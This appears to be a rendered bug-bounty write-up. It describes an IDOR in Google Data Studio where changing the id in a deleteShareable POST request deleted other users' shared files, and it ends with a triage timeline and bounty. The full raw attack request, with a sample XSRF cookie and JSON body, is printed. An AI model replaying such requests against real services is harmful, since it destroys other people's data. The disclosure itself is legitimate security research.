@@ -1,0 +1,44 @@
+I"F<h1 id="idor-in-datastudiogooglecom">Idor in datastudio.google.com</h1>
+
+<h2 id="description">Description :</h2>
+
+<p>Attacker can able to delete any file with vulnerable endpoint ..!</p>
+
+<h2 id="endpoint">Endpoint :</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /u/4/deleteShareable?appVersion=20190926_020020 HTTP/1.1
+Host: datastudio.google.com
+Connection: close
+Content-Length: 54
+Sec-Fetch-Mode: cors
+Origin: https://datastudio.google.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json
+Accept: application/json, text/plain, */*
+encoding: null
+Sec-Fetch-Site: same-origin
+Referer: https://datastudio.google.com/u/4/navigation/reporting
+
+Cookie: RAP_XSRF_TOKEN=ACQ5uE-fZxoHyJIMJ6I9fWifDGZzjTeHCw:1569756166600; gh_7510439=;
+{"id":"9c491b49-a2f7–49fe-bd91-c4783657781","type":0}
+</code></pre></div></div>
+
+<h2 id="vulnerable-paramerterid">vulnerable-paramerter : id</h2>
+
+<p>guessing id here not possible . But if the victim shared his file the id will be visible in url path</p>
+
+<h2 id="triage-time">Triage Time</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>September 29,2019 : Reported
+Oct 1, 2019	  : Triaged
+Oct 8, 2019	  : bountry awarded 5k$
+</code></pre></div></div>
+
+<p>No thanks for reading the report :-</p>
+
+<!--
+## Contact me :
+[twitter](https://twitter.com/critical_b0y) [linkedin](https://www.linkedin.com/in/zbalu/)
+-->
+<p><a href="./">back</a></p>
+:ET
